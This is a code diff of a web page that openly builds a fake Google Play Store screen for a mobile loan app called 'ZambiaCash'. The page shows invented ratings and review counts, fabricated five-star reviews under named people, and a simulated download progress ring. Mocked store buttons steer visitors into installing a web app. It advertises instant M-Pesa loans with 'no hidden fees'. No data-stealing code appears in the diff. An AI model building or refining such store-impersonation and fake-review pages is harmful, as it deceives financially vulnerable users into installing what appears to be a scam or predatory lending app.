@@ -59,7 +59,7 @@
 </head>
 <body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
 
-    <!-- 0. OFFLINE GATE (Shows if no internet) -->
+    <!-- 0. OFFLINE GATE -->
     <div id="offline-gate" class="hide fixed inset-0 z-[11000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
         <div class="w-24 h-24 bg-red-500/20 rounded-full flex items-center justify-center mb-6 animate-pulse">
             <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414"></path></svg>
@@ -90,16 +90,14 @@
     <!-- 2. FAKE PLAY STORE UI -->
     <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20">
         
-        <div class="flex items-center justify-between p-4 sticky top-0 bg-white z-10 border-b border-gray-100">
+        <div class="flex items-center justify-between p-4 sticky top-0 bg-white z-10">
             <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
-            <div class="flex items-center gap-4">
-                <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
-                <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.368 2.684 3 3 0 00-5.368-2.684z"></path></svg>
-            </div>
+            <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path></svg>
         </div>
 
         <div class="p-5 max-w-lg mx-auto">
-            <div class="flex gap-4 mb-6">
+            <!-- App Header -->
+            <div class="flex gap-4 mb-4">
                 <img src="icon.png" class="w-20 h-20 rounded-2xl shadow-sm border border-gray-100" alt="ZambiaCash Icon">
                 <div>
                     <h1 class="text-2xl font-bold text-gray-900 leading-tight">ZambiaCash</h1>
@@ -108,159 +106,167 @@
                 </div>
             </div>
 
-            <div class="flex justify-between items-center text-center py-4 mb-6">
-                <div class="flex-1 flex flex-col items-center">
-                    <div class="flex items-center gap-1">
-                        <span class="font-bold text-lg">4.5</span>
-                        <svg class="w-4 h-4 text-gray-800" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                    </div>
-                    <span class="text-xs text-gray-600">12K reviews ⓘ</span>
-                </div>
-                <div class="w-px h-10 bg-gray-200"></div>
-                <div class="flex-1 flex flex-col items-center">
-                    <svg class="w-5 h-5 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
-                    <span class="font-bold text-sm" id="top-size-text">10 MB</span>
-                </div>
-                <div class="w-px h-10 bg-gray-200"></div>
-                <div class="flex-1 flex flex-col items-center">
-                    <div class="border border-gray-600 rounded px-1.5 text-xs font-bold mb-1">12+</div>
-                    <span class="text-xs text-gray-600">Rated for 12+ ⓘ</span>
-                </div>
-            </div>
-
-            <div class="flex gap-2 mb-8" id="install-action-area">
+            <!-- PRE-INSTALL BUTTONS (Install) -->
+            <div class="flex gap-2 mb-6" id="pre-install-buttons">
                 <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-medium text-lg py-3 rounded-full shadow-sm active:scale-95 transition-transform">Install</button>
             </div>
 
-            <div id="fake-download-area" class="hide mb-8">
-                <div class="flex justify-between text-sm text-gray-600 mb-2">
-                    <span>Downloading...</span>
-                    <span id="download-percent">0%</span>
-                </div>
-                <div class="w-full bg-gray-200 rounded-full h-2">
-                    <div id="download-bar" class="bg-playBlue h-2 rounded-full transition-all duration-300" style="width: 0%"></div>
-                </div>
-                <p class="text-xs text-gray-400 mt-2" id="download-size">1.2 MB / 10.0 MB</p>
+            <!-- POST-INSTALL BUTTONS (Uninstall / Open) -->
+            <div class="flex gap-3 mb-6 hide" id="post-install-buttons">
+                <button class="flex-1 bg-white text-playBlue font-medium text-lg py-3 rounded-full border border-gray-300 active:scale-95 transition-transform">Uninstall</button>
+                <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-medium text-lg py-3 rounded-full shadow-sm active:scale-95 transition-transform">Open</button>
             </div>
 
-            <div id="open-app-area" class="hide mb-8">
-                <div class="bg-green-50 border border-green-200 rounded-xl p-3 mb-3 text-center">
-                    <p class="text-sm text-green-800 font-medium">✅ Installed successfully!</p>
-                    <p class="text-xs text-green-600 mt-1">You can also find ZambiaCash on your home screen.</p>
+            <!-- FAKE DOWNLOAD PROGRESS (Circular Animation) -->
+            <div id="fake-download-area" class="hide mb-6 flex flex-col items-center justify-center py-4">
+                <div class="relative w-28 h-28 mb-3">
+                    <!-- SVG Circular Progress -->
+                    <svg class="w-full h-full transform -rotate-90">
+                        <circle cx="56" cy="56" r="50" stroke="#E5E7EB" stroke-width="5" fill="none" />
+                        <circle id="circle-progress" cx="56" cy="56" r="50" stroke="#0056D2" stroke-width="5" fill="none" stroke-dasharray="314" stroke-dashoffset="314" class="transition-all duration-300"/>
+                    </svg>
+                    <!-- App Icon in the middle -->
+                    <img src="icon.png" class="absolute inset-4 w-20 h-20 rounded-2xl shadow-md border border-gray-100 object-cover" alt="Icon">
                 </div>
-                <button id="btn-open-app" class="w-full bg-playBlue text-white font-bold py-3.5 rounded-full shadow-md active:scale-95 transition-transform flex items-center justify-center gap-2">
-                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
-                    Open
-                </button>
-            </div>
-
-            <!-- SCREENSHOTS -->
-            <div class="flex gap-3 overflow-x-auto hide-scrollbar mb-8 pb-2">
-                <div class="w-40 h-72 bg-brandBlue rounded-xl flex-shrink-0 p-4 flex flex-col justify-between shadow-md">
-                    <div>
-                        <p class="text-blue-200 text-[10px] font-bold tracking-wider">AVAILABLE LIMIT</p>
-                        <p class="text-white text-2xl font-extrabold mt-1">Ksh 50,000</p>
-                    </div>
-                    <div class="bg-white/20 rounded-lg p-3">
-                        <p class="text-white text-sm font-bold">Instant Disbursement</p>
-                        <p class="text-blue-100 text-[10px] mt-1">Straight to M-Pesa</p>
-                    </div>
-                </div>
-                <div class="w-40 h-72 bg-white border border-gray-200 rounded-xl flex-shrink-0 p-4 flex flex-col justify-between shadow-md">
-                    <div>
-                        <p class="text-gray-500 text-[10px] font-bold tracking-wider">INTEREST RATES</p>
-                        <p class="text-brandBlue text-3xl font-extrabold mt-1">10%</p>
-                        <p class="text-gray-500 text-xs mt-1">Only</p>
-                    </div>
-                    <div class="bg-brandBlue/10 rounded-lg p-3">
-                        <p class="text-brandBlue text-sm font-bold">Low Cost</p>
-                        <p class="text-gray-600 text-[10px] mt-1">No hidden fees</p>
-                    </div>
-                </div>
-                <div class="w-40 h-72 bg-green-500 rounded-xl flex-shrink-0 p-4 flex flex-col justify-between shadow-md">
-                    <div>
-                        <p class="text-green-100 text-[10px] font-bold tracking-wider">APPROVAL TIME</p>
-                        <p class="text-white text-3xl font-extrabold mt-1">2 Min</p>
-                    </div>
-                    <div class="bg-white/20 rounded-lg p-3">
-                        <p class="text-white text-sm font-bold">Fastest Loans</p>
-                        <p class="text-green-100 text-[10px] mt-1">24/7 Available</p>
-                    </div>
+                <div class="text-center">
+                    <span id="download-percent" class="text-2xl font-bold text-gray-800">0%</span>
+                    <p class="text-xs text-gray-500 mt-1" id="download-size">1.2 MB / 10.0 MB</p>
                 </div>
             </div>
 
-            <div class="mb-8">
-                <div class="flex items-center justify-between mb-2">
-                    <h3 class="font-bold text-xl">About this app</h3>
-                    <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+            <!-- Stats Row -->
+            <div class="flex justify-between items-center text-center py-4 mb-6 border-y border-gray-100" id="stats-row">
+                <div class="flex-1 flex flex-col items-center">
+                    <div class="flex items-center gap-1">
+                        <span class="font-bold text-sm">4.5</span>
+                        <svg class="w-3 h-3 text-gray-800" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
+                    </div>
+                    <span class="text-[10px] text-gray-600">12K reviews</span>
                 </div>
-                <p class="text-sm text-gray-700 leading-relaxed">
-                    Get instant mobile loans from Ksh 1,000 to Ksh 50,000 directly to your M-Pesa. We offer low interest rates, instant disbursement, and flexible repayment terms of 30 to 90 days. No paperwork, 100% online.
-                </p>
+                <div class="w-px h-8 bg-gray-200"></div>
+                <div class="flex-1 flex flex-col items-center">
+                    <svg class="w-4 h-4 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
+                    <span class="font-bold text-xs">10 MB</span>
+                </div>
+                <div class="w-px h-8 bg-gray-200"></div>
+                <div class="flex-1 flex flex-col items-center">
+                    <div class="border border-gray-600 rounded px-1 text-[10px] font-bold mb-1">12+</div>
+                    <span class="text-[10px] text-gray-600">Rated for 12+</span>
+                </div>
             </div>
 
-            <div class="border-t border-gray-100 pt-6">
-                <div class="flex items-center justify-between mb-4">
-                    <h3 class="font-bold text-xl">Ratings and reviews</h3>
-                    <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
-                </div>
-
-                <div class="space-y-6">
-                    <div>
-                        <div class="flex items-center gap-3 mb-2">
-                            <div class="review-avatar bg-purple-500">J</div>
-                            <div>
-                                <p class="text-sm font-medium text-gray-900">James Mwangi</p>
-                                <p class="text-[11px] text-gray-500">2 days ago</p>
-                            </div>
+            <!-- PRE-INSTALL CONTENT -->
+            <div id="pre-install-content">
+                <div class="flex gap-3 overflow-x-auto hide-scrollbar mb-6 pb-2">
+                    <div class="w-40 h-72 bg-brandBlue rounded-xl flex-shrink-0 p-4 flex flex-col justify-between shadow-md">
+                        <div>
+                            <p class="text-blue-200 text-[10px] font-bold tracking-wider">AVAILABLE LIMIT</p>
+                            <p class="text-white text-2xl font-extrabold mt-1">Ksh 50,000</p>
                         </div>
-                        <div class="flex items-center gap-1 mb-1.5"><span class="star">★★★★★</span></div>
-                        <p class="text-sm text-gray-700 leading-snug">The disbursement is instant. I applied for a loan and received the M-Pesa message in less than 2 minutes. Truly impressive.</p>
-                        <p class="text-xs text-gray-400 mt-2">2 people found this helpful</p>
-                    </div>
-
-                    <div>
-                        <div class="flex items-center gap-3 mb-2">
-                            <div class="review-avatar bg-pink-500">M</div>
-                            <div>
-                                <p class="text-sm font-medium text-gray-900">Mary Wanjiku</p>
-                                <p class="text-[11px] text-gray-500">1 week ago</p>
-                            </div>
+                        <div class="bg-white/20 rounded-lg p-3">
+                            <p class="text-white text-sm font-bold">Instant Disbursement</p>
+                            <p class="text-blue-100 text-[10px] mt-1">Straight to M-Pesa</p>
                         </div>
-                        <div class="flex items-center gap-1 mb-1.5"><span class="star">★★★★★</span></div>
-                        <p class="text-sm text-gray-700 leading-snug">The interest rates are very low compared to other apps I've used. Very fair terms and easy to repay.</p>
-                        <p class="text-xs text-gray-400 mt-2">5 people found this helpful</p>
                     </div>
-
-                    <div>
-                        <div class="flex items-center gap-3 mb-2">
-                            <div class="review-avatar bg-blue-500">P</div>
-                            <div>
-                                <p class="text-sm font-medium text-gray-900">Peter Otieno</p>
-                                <p class="text-[11px] text-gray-500">2 weeks ago</p>
-                            </div>
+                    <div class="w-40 h-72 bg-white border border-gray-200 rounded-xl flex-shrink-0 p-4 flex flex-col justify-between shadow-md">
+                        <div>
+                            <p class="text-gray-500 text-[10px] font-bold tracking-wider">INTEREST RATES</p>
+                            <p class="text-brandBlue text-3xl font-extrabold mt-1">10%</p>
+                            <p class="text-gray-500 text-xs mt-1">Only</p>
                         </div>
-                        <div class="flex items-center gap-1 mb-1.5"><span class="star">★★★★★</span></div>
-                        <p class="text-sm text-gray-700 leading-snug">Fast and instant to M-Pesa. I was in an emergency and this app saved me. The loan was disbursed immediately.</p>
-                        <p class="text-xs text-gray-400 mt-2">1 person found this helpful</p>
+                        <div class="bg-brandBlue/10 rounded-lg p-3">
+                            <p class="text-brandBlue text-sm font-bold">Low Cost</p>
+                            <p class="text-gray-600 text-[10px] mt-1">No hidden fees</p>
+                        </div>
                     </div>
-
-                    <div>
-                        <div class="flex items-center gap-3 mb-2">
-                            <div class="review-avatar bg-green-500">G</div>
-                            <div>
-                                <p class="text-sm font-medium text-gray-900">Grace Njeri</p>
-                                <p class="text-[11px] text-gray-500">3 weeks ago</p>
-                            </div>
+                    <div class="w-40 h-72 bg-green-500 rounded-xl flex-shrink-0 p-4 flex flex-col justify-between shadow-md">
+                        <div>
+                            <p class="text-green-100 text-[10px] font-bold tracking-wider">APPROVAL TIME</p>
+                            <p class="text-white text-3xl font-extrabold mt-1">2 Min</p>
                         </div>
-                        <div class="flex items-center gap-1 mb-1.5"><span class="star">★★★★★</span></div>
-                        <p class="text-sm text-gray-700 leading-snug">Instant cash whenever I need it. The interest is low and they don't have hidden fees. Highly recommended!</p>
-                        <p class="text-xs text-gray-400 mt-2">Helpful</p>
+                        <div class="bg-white/20 rounded-lg p-3">
+                            <p class="text-white text-sm font-bold">Fastest Loans</p>
+                            <p class="text-green-100 text-[10px] mt-1">24/7 Available</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mb-6">
+                    <div class="flex items-center justify-between mb-2">
+                        <h3 class="font-bold text-lg">About this app</h3>
+                        <svg class="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                    </div>
+                    <p class="text-sm text-gray-700 leading-relaxed">
+                        Get instant mobile loans from Ksh 1,000 to Ksh 50,000 directly to your M-Pesa. We offer low interest rates, instant disbursement, and flexible repayment terms of 30 to 90 days. No paperwork, 100% online.
+                    </p>
+                </div>
+
+                <div class="border-t border-gray-100 pt-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="font-bold text-lg">Ratings and reviews</h3>
+                        <svg class="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                    </div>
+                    <div class="space-y-6">
+                        <div>
+                            <div class="flex items-center gap-3 mb-2">
+                                <div class="review-avatar bg-purple-500">J</div>
+                                <div>
+                                    <p class="text-sm font-medium text-gray-900">James Mwangi</p>
+                                    <p class="text-[11px] text-gray-500">2 days ago</p>
+                                </div>
+                            </div>
+                            <div class="flex items-center gap-1 mb-1.5"><span class="star">★★★★★</span></div>
+                            <p class="text-sm text-gray-700 leading-snug">The disbursement is instant. I applied for a loan and received the M-Pesa message in less than 2 minutes. Truly impressive.</p>
+                        </div>
+                        <div>
+                            <div class="flex items-center gap-3 mb-2">
+                                <div class="review-avatar bg-pink-500">M</div>
+                                <div>
+                                    <p class="text-sm font-medium text-gray-900">Mary Wanjiku</p>
+                                    <p class="text-[11px] text-gray-500">1 week ago</p>
+                                </div>
+                            </div>
+                            <div class="flex items-center gap-1 mb-1.5"><span class="star">★★★★★</span></div>
+                            <p class="text-sm text-gray-700 leading-snug">The interest rates are very low compared to other apps I've used. Very fair terms and easy to repay.</p>
+                        </div>
                     </div>
                 </div>
             </div>
+
+            <!-- POST-INSTALL CONTENT -->
+            <div id="post-install-content" class="hide">
+                <div class="mb-8 border-t border-gray-100 pt-6">
+                    <div class="flex justify-between items-center mb-1">
+                        <div class="flex items-center gap-2">
+                            <h3 class="font-bold text-xl">What's new</h3>
+                            <div class="w-2 h-2 rounded-full bg-playBlue"></div>
+                        </div>
+                        <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                    </div>
+                    <p class="text-sm text-gray-500 mb-3">Last updated Aug 31, 2026</p>
+                    <ul class="text-sm text-gray-700 space-y-1">
+                        <li>- Fixed bugs</li>
+                        <li>- Performance Improvements</li>
+                    </ul>
+                </div>
+
+                <div class="mb-8 border-t border-gray-100 pt-6">
+                    <h3 class="font-bold text-xl mb-1">Rate this app</h3>
+                    <p class="text-sm text-gray-500 mb-4">Tell others what you think</p>
+                    <div class="flex justify-between items-center mb-4 px-2">
+                        <svg class="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                        <svg class="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                        <svg class="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                        <svg class="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                        <svg class="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
+                    </div>
+                    <button class="text-playBlue font-medium text-sm">Write a review</button>
+                </div>
+            </div>
+
         </div>
 
+        <!-- BOTTOM NAVIGATION BAR -->
         <div class="fixed bottom-0 left-0 right-0 bg-gray-50 border-t border-gray-200 flex justify-around py-2 z-50">
             <div class="flex flex-col items-center text-gray-600">
                 <svg class="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
@@ -289,14 +295,14 @@
                 </div>
             </div>
 
-            <h1 class="text-2xl font-extrabold text-white mb-2">Installation Complete!</h1>
+            <h1 class="text-2xl font-extrabold text-white mb-2">App Downloaded Successfully!</h1>
             <p class="text-blue-100 text-sm mb-8 max-w-xs leading-relaxed">
                 ZambiaCash is now installed on your phone.
             </p>
 
             <div class="text-5xl mb-4 arrow-bounce text-brandYellow">↑</div>
 
-            <p class="text-white text-base font-bold mb-2">Find ZambiaCash on your home screen</p>
+            <p class="text-white text-base font-bold mb-2">Look for ZambiaCash on your home screen</p>
             <p class="text-blue-200 text-sm mb-8 max-w-xs leading-relaxed">
                 Close this browser tab, then tap the ZambiaCash icon on your phone's home screen to launch the app.
             </p>
@@ -480,11 +486,9 @@
             }
         }
 
-        // Listen for network changes
         window.addEventListener('online', updateConnectionStatus);
         window.addEventListener('offline', updateConnectionStatus);
 
-        // Manual retry button
         window.retryConnection = function() {
             if (navigator.onLine) {
                 offlineGate.classList.add('hide');
@@ -503,21 +507,35 @@
         const appContent = document.getElementById('app-content');
         const findOnHomeScreen = document.getElementById('find-on-home-screen');
         const btnStoreInstall = document.getElementById('btn-store-install');
-        const installActionArea = document.getElementById('install-action-area');
+        
+        // Containers
+        const preInstallButtons = document.getElementById('pre-install-buttons');
+        const postInstallButtons = document.getElementById('post-install-buttons');
         const fakeDownloadArea = document.getElementById('fake-download-area');
-        const openAppArea = document.getElementById('open-app-area');
-        const downloadBar = document.getElementById('download-bar');
+        const preInstallContent = document.getElementById('pre-install-content');
+        const postInstallContent = document.getElementById('post-install-content');
+
+        // Progress elements
+        const circleProgress = document.getElementById('circle-progress');
         const downloadPercent = document.getElementById('download-percent');
         const downloadSize = document.getElementById('download-size');
-        const topSizeText = document.getElementById('top-size-text');
 
         const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
         const wasInstalled = localStorage.getItem('pwa_installed') === 'true';
         const ua = navigator.userAgent || navigator.vendor || window.opera;
         const isInApp = /musical_ly|BytedanceWebview|FBAN|FBAV|Instagram|WebView|Twitter/i.test(ua);
 
-        // Check connection on initial load
         updateConnectionStatus();
+
+        // Function to switch UI to the "Installed" state
+        function showInstalledState() {
+            preInstallButtons.classList.add('hide');
+            fakeDownloadArea.classList.add('hide');
+            preInstallContent.classList.add('hide');
+            
+            postInstallButtons.classList.remove('hide');
+            postInstallContent.classList.remove('hide');
+        }
 
         if (isStandalone) {
             playStoreGate.classList.add('hide');
@@ -527,14 +545,13 @@
             browserWarning.classList.remove('hide');
         } else if (wasInstalled) {
             playStoreGate.classList.remove('hide');
-            installActionArea.classList.add('hide');
-            openAppArea.classList.remove('hide');
-            topSizeText.innerText = "10 MB";
+            showInstalledState();
         } else {
             playStoreGate.classList.remove('hide');
-            installActionArea.classList.remove('hide');
-            openAppArea.classList.add('hide');
-            topSizeText.innerText = "10 MB";
+            preInstallButtons.classList.remove('hide');
+            preInstallContent.classList.remove('hide');
+            postInstallButtons.classList.add('hide');
+            postInstallContent.classList.add('hide');
         }
 
         window.addEventListener('beforeinstallprompt', (e) => {
@@ -552,19 +569,25 @@
             const { outcome } = await deferredPrompt.userChoice;
 
             if (outcome === 'accepted') {
-                installActionArea.classList.add('hide');
+                preInstallButtons.classList.add('hide');
                 fakeDownloadArea.classList.remove('hide');
 
                 let progress = 0;
                 const totalTicks = 100;
                 const tickMs = 300;
                 const increment = 100 / totalTicks;
+                
+                // Calculate circumference for SVG circle (2 * PI * r) = 2 * 3.14159 * 50 = 314.159
+                const circumference = 314.159;
 
                 const interval = setInterval(() => {
                     progress += increment * (0.85 + Math.random() * 0.3);
                     if (progress > 100) progress = 100;
 
-                    downloadBar.style.width = progress + "%";
+                    // Update SVG ring
+                    const offset = circumference - (progress / 100) * circumference;
+                    circleProgress.style.strokeDashoffset = offset;
+
                     downloadPercent.innerText = Math.floor(progress) + "%";
 
                     const downloadedMB = (1.2 + (10.0 - 1.2) * (progress / 100)).toFixed(1);
@@ -573,9 +596,8 @@
                     if (progress >= 100) {
                         clearInterval(interval);
                         setTimeout(() => {
-                            fakeDownloadArea.classList.add('hide');
-                            openAppArea.classList.remove('hide');
                             localStorage.setItem('pwa_installed', 'true');
+                            showInstalledState();
                             showToast("✅ Installed! Look for ZambiaCash on your home screen.");
                         }, 600);
                     }
@@ -586,11 +608,15 @@
             deferredPrompt = null;
         });
 
+        // OPEN BUTTON - Lands on the "Look for it on home screen" education screen immediately
         document.getElementById('btn-open-app').addEventListener('click', () => {
             playStoreGate.classList.add('hide');
+            
+            // Immediately show the education screen
+            findOnHomeScreen.classList.remove('hide');
 
+            // Try to redirect to home screen in the background
             try { window.close(); } catch (e) {}
-
             const isAndroid = /android/i.test(navigator.userAgent);
             if (isAndroid) {
                 setTimeout(() => {
@@ -599,12 +625,6 @@
                     } catch (e) {}
                 }, 150);
             }
-
-            setTimeout(() => {
-                if (!document.hidden) {
-                    findOnHomeScreen.classList.remove('hide');
-                }
-            }, 1200);
         });
 
         document.getElementById('btn-close-tab').addEventListener('click', () => {
@@ -630,9 +650,7 @@
 
         window.addEventListener('appinstalled', () => {
             localStorage.setItem('pwa_installed', 'true');
-            installActionArea.classList.add('hide');
-            fakeDownloadArea.classList.add('hide');
-            openAppArea.classList.remove('hide');
+            showInstalledState();
         });
 
         // ==========================================
